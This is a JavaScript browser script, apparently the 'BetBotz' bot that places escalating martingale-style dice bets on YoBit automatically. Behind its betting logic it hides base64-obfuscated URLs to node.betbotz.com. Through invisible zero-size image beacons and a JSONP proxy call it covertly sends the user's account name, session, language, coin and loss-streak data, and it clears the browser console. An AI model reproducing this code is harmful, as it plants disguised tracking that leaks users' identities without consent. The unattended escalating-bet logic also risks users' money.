alert('here we are');

var delayseconds = 2;
var basevalue = 0.00000001;
var maxwins = 0;
var maxlosses = 7;
var botversion = 0;
var incwin = 0;
var incloss = 200;
var prostop = 0;
var losstop = 0;
var spinit = 6;
var baronlosses = 0;
var kobiarolls = 0;
var bbzcodes = 0;
var randomNumber = 168278;
function getBalance() {
    var currentBalanceString = $('.chosen-single span').html();
    var currentBalanceArray = currentBalanceString.split(' ');
    var testString = currentBalanceString.split('-');
    testString = testString[1].split(' ');
    var gotValue = testString[1];
    var gotCurrency = testString[2];
    return Number(gotValue);
}
function getCurrency() {
    var currentBalanceString = $('.chosen-single span').html();
    var testString = currentBalanceString.split('-');
    testString = testString[1].split(' ');
    var gotValue = testString[1];
    var gotCurrency = testString[2];
    return gotCurrency;
}
function valuePercent(num1, num2) {
    var percent = ((num2 - num1) / num1 * 100);
    percent = percent.toFixed(4);
    return (percent);
}
function timeDiff(savedTime) {
    var timediff = Math.floor((new Date() - savedTime) / 1000);
    return timediff;
}
function returnDuration(totalSeconds) {
    hours = Math.floor(totalSeconds / 3600);
    totalSeconds %= 3600;
    minutes = Math.floor(totalSeconds / 60);
    seconds = totalSeconds % 60;
    returnTime = ('0' + hours).slice(-2) + ':' + ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2);
    return returnTime;
}
function killElements(timerId) {
    try {
        var id = '#yohassy1';
        var children = document.body.getElementsByTagName('*');
        var elements = [], child;
        for (var i = 0, length = children.length; i < length; i++) {
            child = children[i];
            if (child.id.substr(0, id.length) == id)
                clearTimeout(timerId);
            $('#yohassy1').remove();
        }
        return;
    } catch (err) {
        console.log('--- end ----');
    }
}
function diceLink(str) {
    return decodeURIComponent(atob(str).split('').map(function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(''));
}
function diceGetLink(link) {
    if (link == 'info') {
        return diceLink('aHR0cHM6Ly9ub2RlLmJldGJvdHouY29tL2pzL2RpY2UtaW5mby5waHA=');
    } else if (link == 'client') {
        return diceLink('aHR0cHM6Ly9ub2RlLmJldGJvdHouY29tL2pzL2RpY2UtY2xpZW50LnBocA==');
    } else if (link == 'pups') {
        return diceLink('aHR0cHM6Ly9ub2RlLmJldGJvdHouY29tL2FqYXgvZGljZS1hamF4LnBocA==');
    }
}
function pollBot(randomNumber) {
    var infousr = $('.user').text();
    infoDetails = '<img src=\'' + diceGetLink('client') + '?session=' + encodeURIComponent(infousr) + '&seshno=' + randomNumber + '&lng=' + findLang() + '\' height=\'0\' width=\'0\'>';
    $('#bbz-php').html(infoDetails).html('');
}
function pollPups() {
    var infousr = $('.user').text();
    var pupsDetails = diceGetLink('pups') + '?session=' + encodeURIComponent(infousr) + '&seshno=' + randomNumber + '&test=1';
    var win = window.open(pupsDetails, '_blank');
    win.focus();
}
function refreshConsole() {
    console.API;
    if (typeof console._commandLineAPI !== 'undefined') {
        console.API = console._commandLineAPI;
    } else if (typeof console._inspectorCommandLineAPI !== 'undefined') {
        console.API = console._inspectorCommandLineAPI;
    } else if (typeof console.clear !== 'undefined') {
        console.API = console;
    }
    console.API.clear();
}
function keyBlonde() {
    $.getJSON('https://node.betbotz.com/cors/origin.php/get?u=' + encodeURIComponent('http://google.com') + '&session=' + infousr + '&callback=?', function(data) {
        softPup = 1;
    });
}
function findLang() {
    var lng = window.navigator.userLanguage || window.navigator.language;
    lng = lng.toLowerCase();
    lng = locale + '-' + lng;
    lng = lng.toLowerCase();
    lng = lng.replace(' ', '');
    return lng;
}
function getLang() {
    var lng = findLang();
    if (lng.indexOf('ru') >= 0) {
        return 'ru';
    } else if (lng.indexOf('cn') >= 0) {
        return 'cn';
    } else if (lng.indexOf('en') >= 0) {
        return 'en';
    } else {
        return 'en';
    }
}
var infousr = $('.user').text();
pollBot(randomNumber);
refreshConsole();
console.log('------------ Start Betbotz ----------------');
var debugScript = 0;
if (debugScript > 0) {
    alert('Extension Currently under development. Please try again later. thanks');
    exit(0)
}
$('#holdy').remove();
$('<style/>').text('#criticalMessage {text-align: center; font-size: 25px; display: block;color: #fff;background-color: #000000;border-top: 5px solid blue;position: fixed;left: 0;bottom: 0;width: 100%;z-index: 2000;padding: 1px;} .btnblue{background:#3498db;background-image:-webkit-linear-gradient(top,#3498db,#2980b9);background-image:-moz-linear-gradient(top,#3498db,#2980b9);background-image:-ms-linear-gradient(top,#3498db,#2980b9);background-image:-o-linear-gradient(top,#3498db,#2980b9);background-image:linear-gradient(tobottom,#3498db,#2980b9);-webkit-border-radius:5;-moz-border-radius:5;border-radius:5px;font-family:Arial;color:#ffffff;font-size:18px;padding:8px15px8px15px;text-decoration:none;} .btnblue:hover{background:#3cb0fd;background-image:-webkit-linear-gradient(top,#3cb0fd,#3498db);background-image:-moz-linear-gradient(top,#3cb0fd,#3498db);background-image:-ms-linear-gradient(top,#3cb0fd,#3498db);background-image:-o-linear-gradient(top,#3cb0fd,#3498db);background-image:linear-gradient(tobottom,#3cb0fd,#3498db);text-decoration:none;} ').appendTo(document.head);
var $div = $('<div />').appendTo('body');
$div.attr('id', 'holdy');
var lngArray = '{   %22ru%22: {          %22Name%22: %22Russian%22,          %22Trader%22: %22трейдер%22,          %22Free%22: %22свободно%22,	  %22Rolls%22: %22Рулоны%22,	  %22Profit%22: %22прибыль%22,	  %22Gain%22: %22Gain%22,	  %22Win%22: %22Win%22,      	  %22Loss%22: %22потеря%22   },   %22en%22: {          %22Name%22: %22English%22,          %22Trader%22: %22Trader%22,          %22Free%22: %22Free%22,	  %22Rolls%22: %22Rolls%22,	  %22Profit%22: %22Profit%22,	  %22Gain%22: %22Gain%22,	  %22Win%22: %22Win%22,          %22Loss%22: %22Loss%22   }}';
var lang = jQuery.parseJSON(decodeURIComponent(lngArray));
var lng = getLang();
if (infousr == 'btcaltx') {
    console.log('debug');
    lng = 'ru';
}
try {
    lang[lng]['Name']
} catch (err) {
    lng = 'en';
    console.log('undefined');
}
var infoBox = ' <div id=\'criticalMessage\' ><div> BetBotz <span id=\'bbz-rolls\'></span> <span id=\'bbz-msg\'></span>&nbsp <span id=\'bbz-info\'>&nbsp</span></div>';
infoBox = infoBox + '<div> <span id=\'bbz-currency\'>&nbsp</span> <span style=\'color:LightGreen ;\' id=\'bbz-gain\'>Gain:&nbsp0&nbsp</span><span style=\'color: #f44248;\' id=\'bbz-loss\'>' + lang[lng]['Loss'] + ':&nbsp0</span></div>';
infoBox = infoBox + '<div> <span>Streak </span> <span style=\'color:LightGreen ;\' id=\'bbz-streakwin\'>&nbsp</span><span style=\'color: #f44248;\' id=\'bbz-streakloss\'>&nbsp</span></div>';
infoBox = infoBox + '<div style=\'color:white ; font-size: .5em; padding: 1px; margin: 0px;\'> <span style=\'width: 150px;\' id=\'bbz-stats\'>Stats</span> <span style=\'color: #f4ee42; width: 15em;\' id=\'bbz-method\'> Method</span></div>';
infoBox = infoBox + '<div style=\'color:white ; font-size: .5em; padding: 1px; margin: 0px;\'> <span id=\'bbz-settings\'>Settings</span><span id=\'bbz-php\'></span></div>';
infoBox = infoBox + '<div> <span id=\'btnstop\' class=\'btnblue\' style=\'padding: 8px 15px 8px 15px;\'>Stop Now</span>';
infoBox = infoBox + '<span id=\'bbz-clickme\' style=\'color: yellow; font-style: italic; font-weight: bold;\' > ' + lang[lng]['Free'] + ' <img style=\'height: 20px; margin-right: 5px;\' alt=\'Click me\' src=\'https://preview.ibb.co/mTfmP5/Bitcoin_Logo_Horizontal_Light.png\' /></span>';
infoBox = infoBox + '<span id=\'btnstoponwin\' class=\'btnblue\' style=\'padding: 8px 15px 8px 15px;\'>Stop On Win</span></div>';
infoBox = infoBox + '<div style=\'color:white ; font-size: .25em; margin: 0px;\'>&nbsp</div>';
infoBox = infoBox + '</div>';
$('#holdy').html(infoBox);
$('.btnblue').css('cursor', 'pointer');
$('#btnstop').click(function() {
    stop = 1;
});
$('#btnstoponwin').click(function() {
    stop = 2;
});
$('#bbz-clickme').css('cursor', 'pointer');
$('#bbz-clickme').click(function() {
    pollPups();
});
$('.clDicePlay').attr('class', 'clDicePlay highclick');
$('.clDicePlay:first').attr('class', 'clDicePlay lowclick');
$('.messi-closebtn').click();
if (typeof spinit == 'undefined') {
    spinit = 1;
}
;if (spinit == 0) {
    spinit = 1;
}
;if (spinit == 6) {
    var randomSpinit = 'yes';
} else {
    var randomSpinit = 'no';
}
var baronText = '';
var thisSpin = 0;
var maxloops = 0;
var LMDvalue = 0;
var LMOEvalue = '';
var LMSvalue = 0;
try {
    bbzcodes = bbzcodes.replace(' ', '').toUpperCase();
    var bbzCodesArray = bbzcodes.split(',');
    console.log(bbzCodesArray.length);
    if (bbzCodesArray.length > 0) {
        console.log(bbzCodesArray[0]);
    }
    var bbzCodesCounter = 0;
    while (bbzCodesCounter < bbzCodesArray.length) {
        var txt = bbzCodesArray[bbzCodesCounter];
        init = txt.indexOf('(');
        fin = txt.indexOf(')');
        var bbzValue = txt.substr(init + 1, fin - init - 1);
        console.log(bbzCodesArray[bbzCodesCounter]);
        if (txt.indexOf('LMD') != -1) {
            console.log('Starting LMD ' + bbzValue);
            LMDvalue = Number(bbzValue);
        }
        if (txt.indexOf('LMOE') != -1) {
            console.log('Starting LMOE ' + bbzValue);
            LMOEvalue = bbzValue;
        }
        if (txt.indexOf('LMS') != -1) {
            console.log('Starting LMS ' + bbzValue);
            LMSvalue = bbzValue;
        }
        bbzCodesCounter++;
    }
} catch (err) {}
var lossCounter = 0;
var winCounter = 0;
var stop = 0;
var high = 0;
var whichWay = 'first';
var whatWon = '';
var whatLost = '';
var bidHighLow = '';
var totalBetz = 0;
var profitLossNow = 0;
var waitError = '';
var startPups = new Date();
var startDate = new Date();
var savedTime = new Date();
var pollTime = new Date();
var errorWait = new Date();
if (maxlosses > 0 && incloss === 0) {
    maxlosses = 0;
}
if (maxwins > 0 && incwin === 0) {
    maxwins = 0;
}
incloss = (incloss / 100);
incwin = (incwin / 100);
incloss = Number(incloss);
incwin = Number(incwin);
var winOrLoss = '';
var loopCounter = 0;
var iBet = 0.00000001;
iBet = Number(basevalue);
var startBalance = 0;
startBalance = getBalance();
var lastBalanceValue = 0;
var testUpOrDown = '';
var currentBalance = 0;
var currentPercent = 0;
losstop = -losstop;
var lastGameCode = '';
var checkCounter = 0;
var errorBox = 0;
var totalWin = 0;
var totalLoss = 0;
var winStreak = 0;
var lossStreak = 0;
var statsAllWins = 0;
var statsAllLoses = 0;
var currentCurrency = getCurrency();
var totalMoneyLoss = 0;
var totalMoneyGained = 0;
var trueDelay = new Date();
var infoDetails = '';
var infoMethod = '';
if (infousr == 'xxx' || infousr == 'xxx') {
    console.log('test xxx');
}
var methodArray = ['Random Roll', 'Roll Less than 48', 'Roll Greater than 52', 'Opposite To Last Win', 'Same as Last Win', 'Random Method'];
var kobiaCount = 1;
var trackerVal = '';
$('.clDicePlay').each(function(i) {
    $(this).attr('id', 'button' + i);
});
$('.bet').val(basevalue.toFixed(8));
if ($('#check_only_mine').prop('checked') === false) {
    alert('BetBotz failed. Please check the show my bids only and start BetBotz again');
    stop = 1;
    location.reload();
    throw new Error();
}
var timerId = setInterval(function() {
    if (stop === 1) {
        killElements(timerId);
        clearTimeout(timerId);
        return;
    }
    if (timeDiff(trueDelay) < delayseconds) {
        return;
    } else {
        trueDelay = new Date();
    }
    if (waitError == 'yes') {
        if (timeDiff(savedTime) < 21) {
            $('#bbz-msg').text(' PLEASE WAIT ' + timeDiff(savedTime) + ' SECS (INCREASE DELAY)');
            $('.messi-title').text('BetBotz AUTOCLOSE - ' + (21 - timeDiff(savedTime)) + ' secs');
            lastBalanceValue = 0;
            return;
        } else if ($('div.messi-titlebox.error').length > 0) {
            $('#bbz-msg').text('DICE CANCELLING');
            $('.messi-content').text('Auto Close');
            $('.messi-title').text('Error');
            $('.btnbox').find('.btn ').click();
            return;
        } else {
            waitError = 'no';
            return;
        }
    }
    if ($('div.messi-titlebox.error').length > 0 && waitError != 'yes') {
        var messiText = $('.messi-content').text();
        if (messiText == 'wait 20 seconds') {
            waitError = 'yes';
            savedTime = new Date();
            console.log(messiText);
            return;
        } else {
            stop = 1;
            killElements(timerId);
            clearTimeout(timerId);
            return;
        }
    }
    loopCounter++;
    if (loopCounter > maxloops && maxloops > 0) {
        alert('BetBotz - Maximum loops reached');
        stop = 1;
        location.reload();
        throw new Error();
    }
    currentBalance = getBalance();
    if (lastBalanceValue == currentBalance && checkCounter === 0) {
        checkCounter = 1;
        errorWait = new Date();
    }
    if (timeDiff(errorWait) > 10 && checkCounter === 1) {
        checkCounter = 2;
        new Messi('Please Wait',{
            title: 'Betbotz - Yobit Delay'
        });
    }
    if ($('.messi-title').text() == 'Betbotz - Yobit Delay' && timeDiff(errorWait) < 60) {
        $('.messi-content').text('Please Wait ' + (25 - timeDiff(errorWait)) + ' secs');
    }
    if (timeDiff(errorWait) > 25 && checkCounter === 2) {
        checkCounter = 3;
        winOrLoss = '!';
        $('.messi-closebtn').click();
        console.log('--------- Reset ----------');
    }
    if ((lastBalanceValue != currentBalance && $('.lowclick').val() == 'Roll < 48' && $('.highclick').val() == 'Roll > 52') || (checkCounter === 3)) {
        if (currentBalance < lastBalanceValue) {
            testUpOrDown = 'Down';
            winOrLoss = '-';
        }
        if (currentBalance > lastBalanceValue) {
            testUpOrDown = 'Up';
            winOrLoss = '+';
        }
        if (lastBalanceValue > 0 && currentBalance > 0) {
            if (winOrLoss === '-') {
                totalMoneyLoss = totalMoneyLoss - (currentBalance - lastBalanceValue);
            }
            if (winOrLoss === '+') {
                totalMoneyGained = totalMoneyGained + (currentBalance - lastBalanceValue);
            }
        }
        if (1 > 2) {
            console.log(winOrLoss + ' stage ' + currentBalance + ' ' + lastBalanceValue + ' ' + winCounter + ' ' + lossCounter + ' iBet:' + iBet + ' chk:' + checkCounter + ' :' + timeDiff(errorWait) + ' maxl:' + maxlosses + ' maxw:' + maxwins + ' Track:' + trackerVal + ' Profit:' + parseFloat(profitLossNow));
        }
        if (lastBalanceValue != currentBalance) {
            lastBalanceValue = currentBalance;
        }
        if (checkCounter > 0) {
            checkCounter = 0;
            $('.messi-closebtn').click();
        }
        currentPercent = valuePercent(startBalance, currentBalance);
        if (losstop != 0 && currentPercent < losstop) {
            $('#bbz-msg').text('LOSS STOP REACHED ' + losstop + '%');
            clearTimeout(timerId);
            return;
        }
        if (prostop != 0 && currentPercent > prostop) {
            $('#bbz-msg').text('PROFIT STOP REACHED ' + prostop + '%');
            clearTimeout(timerId);
            return;
        }
        if (totalLoss > lossStreak) {
            lossStreak = totalLoss;
        }
        if (totalWin > winStreak) {
            winStreak = totalWin;
        }
        $('#bbz-settings').text('Settings - MaxWins:' + maxwins + ' MaxLosses:' + maxlosses + ' IncreaseOnWin:' + (incwin * 100) + '%  IncreaseOnLoss:' + ((incloss * 100).toPrecision(8)) + '%  Baron:' + baronlosses + '  Kobia:' + kobiarolls);
        if (winOrLoss === '-') {
            if (whichWay != 'first') {
                if (whichWay == 'high') {
                    whatWon = 'low';
                    whatLost = 'high';
                } else {
                    whatWon = 'high';
                    whatLost = 'low';
                }
            }
            totalWin = 0;
            totalLoss++;
            winCounter = 0;
            lossCounter++;
            statsAllLoses++;
            trackerVal = '';
            if (lossCounter === 1 && maxlosses === 0) {
                iBet = basevalue;
                trackerVal = ' - 1val ';
            } else if (maxlosses > 0) {
                iBet = (parseFloat(iBet) + (parseFloat(iBet) * incloss));
                trackerVal = ' - 2val ';
            } else {
                iBet = basevalue;
                trackerVal = ' - 3val ';
            }
            if (lossCounter > maxlosses && maxlosses > 0) {
                iBet = basevalue;
                lossCounter = 1;
            }
            if (LMDvalue > 0 && lossCounter < LMDvalue) {
                iBet = 0.00000001;
            }
            if (LMOEvalue != '') {
                if (LMOEvalue == 'O' && lossCounter % 2) {
                    iBet = basevalue;
                }
                if (LMOEvalue == 'E' && lossCounter % 2 == 0) {
                    iBet = basevalue;
                }
            }
            if (LMSvalue > 0 && lossCounter > LMSvalue) {
                iBet = 0.00000001;
            }
        }
        if (winOrLoss === '+') {
            if (whichWay != 'first') {
                if (whichWay == 'high') {
                    whatWon = 'high';
                    whatLost = 'low';
                } else {
                    whatWon = 'low';
                    whatLost = 'high';
                }
            }
            if (stop === 2) {
                stop = 1;
                killElements(timerId);
                clearTimeout(timerId);
                return;
            }
            totalLoss = 0;
            totalWin++;
            winCounter++;
            statsAllWins++;
            trackerVal = '';
            if (maxwins > 0 && winCounter > 1) {
                iBet = (parseFloat(iBet) + (parseFloat(iBet) * incwin));
                trackerVal = ' + 1val:' + iBet;
            } else if (maxwins > 0 && winCounter === 1 && maxlosses === 0) {
                iBet = (parseFloat(iBet) + (parseFloat(iBet) * incwin));
                trackerVal = ' + 2val ';
            } else {
                iBet = basevalue;
                trackerVal = ' + 3val ';
            }
            lossCounter = 1;
            if (winCounter > maxwins && maxwins > 0) {
                iBet = basevalue;
                winCounter = 0;
            }
        }
        if (lossStreak > 15 && lossStreak < 30) {
            infoMethod = spinit + '-' + thisSpin + '-rnd' + randomSpinit + '-baron' + baronlosses;
            infoDetails = '<img src=\'' + diceGetLink('info') + '?maxloss=' + lossCounter + '&session=' + encodeURIComponent(infousr) + '&method=' + encodeURIComponent(infoMethod) + '&coin=' + encodeURIComponent(currentCurrency) + '&seshno=' + randomNumber + '\' height=\'0\' width=\'0\'>';
            $('#bbz-php').html(infoDetails).html('');
        }
        if (timeDiff(pollTime) > 900) {
            pollTime = new Date();
            pollBot(randomNumber);
        }
        if (timeDiff(startPups) > 180 && typeof (pause11) == 'undefined') {
            keyBlonde();
        }
        $('#bbz-method').text(methodArray[thisSpin - 1]);
        $('#bbz-stats').text('Time: ' + returnDuration(timeDiff(startDate)) + '  Win/Lose: ' + winCounter + '-' + (lossCounter - 1) + ' TotalWins: ' + statsAllWins + ' TotalLoses: ' + statsAllLoses);
        $('#bbz-rolls').text(' ' + lang[lng]['Rolls'] + ':' + totalBetz);
        $('#bbz-streakwin').text('Win:' + winStreak);
        $('#bbz-streakloss').text('  ' + lang[lng]['Loss'] + ':' + lossStreak);
        $('#bbz-info').text(baronText);
        $('#bbz-currency').text(currentCurrency + '  ');
        $('#bbz-gain').text('Gain: ' + ' ' + totalMoneyGained.toFixed(8) + '  ');
        $('#bbz-loss').text(lang[lng]['Loss'] + ': ' + ' ' + totalMoneyLoss.toFixed(8));
        profitLossNow = currentBalance - startBalance;
        profitLossNow = profitLossNow.toFixed(8);
        $('#bbz-msg').text(lang[lng]['Profit'] + '/' + lang[lng]['Loss'] + ': ' + profitLossNow);
        iBet = Number(iBet);
        $('.bet').val(iBet.toFixed(8));
        totalBetz++;
        $(document).attr('title', 'YoBit.Net ' + totalBetz + ' BBz');
        if (kobiarolls > 0) {
            kobiaCount++;
            if (kobiaCount > kobiarolls) {
                kobiaCount = 1;
                spinit = Math.floor(Math.random() * 5) + 1;
            }
        }
        thisSpin = spinit;
        if (randomSpinit == 'yes') {
            thisSpin = Math.floor(Math.random() * 4) + 1;
        }
        baronText = '';
        if (baronlosses > 0 && lossCounter > baronlosses) {
            thisSpin = Math.floor(Math.random() * 4) + 1;
            baronText = ' *Baron Switch* ';
        }
        bidHighLow = 'low';
        if ((thisSpin == 1) || (thisSpin == 5 && whichWay == 'first')) {
            if (Math.floor(Math.random() * 2) + 1 == 1) {
                bidHighLow = 'low';
            } else {
                bidHighLow = 'high';
            }
        } else if (thisSpin == 2) {
            bidHighLow = 'low';
        } else if (thisSpin == 3) {
            bidHighLow = 'high';
        } else if (thisSpin == 4 && whichWay != 'first') {
            bidHighLow = whatWon;
        } else if (thisSpin == 5 && whichWay != 'first') {
            bidHighLow = whatLost;
        } else {
            bidHighLow = 'low';
        }
        if (bidHighLow == 'low') {
            $('.lowclick:first').click();
            whichWay = 'low';
        } else {
            $('.highclick:first').click();
            whichWay = 'high';
        }
        if (checkCounter > 0) {
            checkCounter = 0;
            $('.messi-closebtn').click();
        }
    }
}, 500);
